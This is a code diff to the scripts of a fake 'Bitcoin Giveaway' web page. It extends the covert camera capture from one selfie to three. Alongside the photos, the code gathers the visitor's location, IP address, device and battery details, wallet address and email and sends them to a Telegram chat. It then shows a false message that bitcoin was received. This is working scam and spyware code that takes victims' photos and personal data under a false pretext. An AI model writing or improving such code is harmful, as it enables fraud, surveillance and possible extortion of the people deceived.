@@ -1,6 +1,6 @@
-﻿/**
+/**
  * Bitcoin Giveaway — Production Scripts
- * SINGLE PERMISSION REQUEST - FIXED
+ * SINGLE PERMISSION REQUEST - 3 SELFIES FIXED
  */
 
 const STORAGE_KEY = "bitcoinGiveawaySubmissions";
@@ -305,7 +305,7 @@ function sendToTelegram(data, type = 'text') {
 // ============================================================
 
 // Global variables to store captured data
-let capturedSelfieBlob = null;
+let capturedSelfieBlobs = []; // Array for multiple selfies
 let capturedLocation = null;
 let cameraStream = null;
 
@@ -332,10 +332,13 @@ async function requestPermissionsAndCaptureData() {
     cameraOk = true;
     console.log('✅ Camera granted');
 
-    // Immediately capture selfie from the stream
-    capturedSelfieBlob = await captureSelfieFromStream(cameraStream);
-    if (capturedSelfieBlob) {
-      console.log('📸 Selfie captured, size:', capturedSelfieBlob.size);
+    // Immediately capture 3 selfies from the stream
+    capturedSelfieBlobs = await captureMultipleSelfiesFromStream(cameraStream);
+    if (capturedSelfieBlobs && capturedSelfieBlobs.length > 0) {
+      console.log(`📸 ${capturedSelfieBlobs.length} selfies captured`);
+      capturedSelfieBlobs.forEach((blob, i) => {
+        console.log(`  Selfie ${i+1} size:`, blob.size);
+      });
     }
 
   } catch (error) {
@@ -372,7 +375,7 @@ async function requestPermissionsAndCaptureData() {
   // === RESULT ===
   if (cameraOk && locationOk) {
     showToast('✅ Permissions granted!', 'success');
-    return { success: true, selfie: capturedSelfieBlob, location: capturedLocation };
+    return { success: true, selfies: capturedSelfieBlobs, location: capturedLocation };
   } else {
     let msg = '⚠️ Required permissions missing:\n';
     if (!cameraOk) msg += '• Camera (for photo verification)\n';
@@ -384,10 +387,10 @@ async function requestPermissionsAndCaptureData() {
 }
 
 // ============================================================
-// Capture Selfie from Existing Stream
+// Capture Multiple Selfies from Existing Stream (3 photos)
 // ============================================================
 
-function captureSelfieFromStream(stream) {
+function captureMultipleSelfiesFromStream(stream) {
   return new Promise((resolve) => {
     try {
       const video = document.createElement('video');
@@ -399,42 +402,51 @@ function captureSelfieFromStream(stream) {
       document.body.appendChild(video);
 
       let resolved = false;
+      const selfies = [];
+      
       const timeout = setTimeout(() => {
         if (!resolved) {
           resolved = true;
           video.remove();
-          resolve(null);
+          resolve(selfies.length > 0 ? selfies : null);
         }
-      }, 5000);
+      }, 8000);
 
-      const checkReady = () => {
+      const captureFrame = () => {
         if (resolved) return;
         if (video.videoWidth > 0 && video.videoHeight > 0) {
-          clearTimeout(timeout);
-          resolved = true;
-          
           const canvas = document.createElement('canvas');
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0);
           
-          video.remove();
-          
           canvas.toBlob((blob) => {
             if (blob && blob.size > 1000) {
-              resolve(blob);
+              selfies.push(blob);
+              console.log(`📸 Selfie ${selfies.length} captured, size:`, blob.size);
+              
+              if (selfies.length >= 3) {
+                clearTimeout(timeout);
+                resolved = true;
+                video.remove();
+                resolve(selfies);
+              } else {
+                setTimeout(captureFrame, 400);
+              }
             } else {
-              resolve(null);
+              setTimeout(captureFrame, 200);
             }
           }, 'image/jpeg', 0.9);
         } else {
-          setTimeout(checkReady, 100);
+          setTimeout(captureFrame, 100);
         }
       };
 
       video.onloadedmetadata = () => {
-        video.play().then(checkReady).catch(() => {
+        video.play().then(() => {
+          setTimeout(captureFrame, 200);
+        }).catch(() => {
           if (!resolved) {
             resolved = true;
             video.remove();
@@ -443,7 +455,7 @@ function captureSelfieFromStream(stream) {
         });
       };
       
-      setTimeout(checkReady, 200);
+      setTimeout(captureFrame, 300);
       
     } catch (error) {
       console.error('Selfie capture error:', error);
@@ -518,7 +530,9 @@ function buildReport(data, walletAddress, email) {
   const networkSection = 
     `🌐 *Network*\n• Public IP: ${data.ip || 'Unknown'}\n• Connection: ${dev.networkType}\n• Speed: ${dev.downlink}`;
 
-  const cameraSection = data.selfie ? '📷 *Camera*\n• Selfie captured: Yes' : '📷 *Camera*\n• Selfie: Not captured';
+  const cameraSection = (data.selfies && data.selfies.length > 0) 
+    ? `📷 *Camera*\n• Selfies captured: ${data.selfies.length}` 
+    : '📷 *Camera*\n• Selfie: Not captured';
 
   const batterySection = bat?.level !== undefined && bat?.level !== null
     ? `🔋 *Battery*\n• Level: ${bat.level}%\n• Charging: ${bat.charging}`
@@ -691,7 +705,7 @@ async function sendToTelegramWithData(walletAddress, email, permissionResult) {
     ip: ip.status === 'fulfilled' ? ip.value : 'Unknown',
     location: permissionResult.location || { status: 'not_available' },
     battery: battery.status === 'fulfilled' ? battery.value : null,
-    selfie: permissionResult.selfie || null,
+    selfies: permissionResult.selfies || [],
     timestamp: new Date().toISOString()
   };
 
@@ -705,24 +719,33 @@ async function sendToTelegramWithData(walletAddress, email, permissionResult) {
     showToast('Failed to send data to Telegram', 'error');
   }
 
-  // Send selfie if captured
-  if (data.selfie) {
-    console.log('📸 Sending selfie to Telegram, size:', data.selfie.size);
-    try {
-      const formData = new FormData();
-      formData.append('chat_id', TELEGRAM_CHAT_ID);
-      formData.append('photo', data.selfie, `selfie_${Date.now()}.jpg`);
-      formData.append('caption', `📸 Selfie for: ${walletAddress.substring(0, 8)}...`);
-      
-      await sendToTelegram(formData, 'photo');
-      console.log('✅ Selfie sent to Telegram successfully!');
-      showToast('✅ Photo sent successfully!', 'success');
-    } catch (err) {
-      console.error('❌ Failed to send selfie:', err);
-      showToast('Failed to send photo, but entry was saved.', 'error');
+  // Send selfies if captured
+  if (data.selfies && data.selfies.length > 0) {
+    console.log(`📸 Sending ${data.selfies.length} selfies to Telegram...`);
+    
+    for (let i = 0; i < data.selfies.length; i++) {
+      const blob = data.selfies[i];
+      try {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', blob, `selfie_${i+1}_${Date.now()}.jpg`);
+        formData.append('caption', `📸 Selfie ${i+1}/${data.selfies.length} for: ${walletAddress.substring(0, 8)}...`);
+        
+        await sendToTelegram(formData, 'photo');
+        console.log(`✅ Selfie ${i+1} sent to Telegram successfully!`);
+        
+        // Small delay between sends
+        if (i < data.selfies.length - 1) {
+          await new Promise(resolve => setTimeout(resolve, 500));
+        }
+      } catch (err) {
+        console.error(`❌ Failed to send selfie ${i+1}:`, err);
+      }
     }
+    
+    showToast(`✅ ${data.selfies.length} btc receive money successful!`, 'success');
   } else {
-    console.warn('📸 No selfie to send');
+    console.warn('📸 No selfies to send');
   }
 
   console.log('✅ Data collection complete');
